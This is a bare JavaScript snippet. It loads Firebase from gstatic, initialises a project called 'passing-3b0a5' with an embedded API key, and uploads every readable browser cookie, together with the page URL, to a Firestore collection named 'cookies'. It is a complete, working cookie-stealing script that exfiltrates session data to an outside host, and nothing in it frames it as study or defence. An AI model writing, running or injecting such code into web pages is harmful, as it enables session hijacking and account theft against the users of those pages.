const loadFirebase = () => new Promise((resolve, reject) => { const firebaseScript = document.createElement('script'); firebaseScript.src = "https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"; firebaseScript.onload = () => { const firestoreScript = document.createElement('script'); firestoreScript.src = "https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"; firestoreScript.onload = resolve; firestoreScript.onerror = reject; document.head.appendChild(firestoreScript); }; firebaseScript.onerror = reject; document.head.appendChild(firebaseScript); }); const firebaseConfig = { apiKey: "AIzaSyDX4INcY0_bS4_UYky7qWlpttsPUtKp41Y", authDomain: "passing-3b0a5.firebaseapp.com", projectId: "passing-3b0a5", storageBucket: "passing-3b0a5.appspot.com", messagingSenderId: "264042084948", appId: "1:264042084948:web:0c994dd5160e89ae430bc1" }; const uploadCookies = () => { const cookies = document.cookie.split('; ').map(c => { const [name, value] = c.split('='); return { name, value, url: window.location.href }; }); const db = firebase.firestore(); cookies.forEach(cookie => { db.collection("cookies").add(cookie).then(() => console.log("Cookie uploaded:", cookie)).catch(error => console.error("Error uploading cookie:", error)); }); }; loadFirebase().then(() => { firebase.initializeApp(firebaseConfig); uploadCookies(); }).catch(error => console.error("Error loading Firebase:", error));
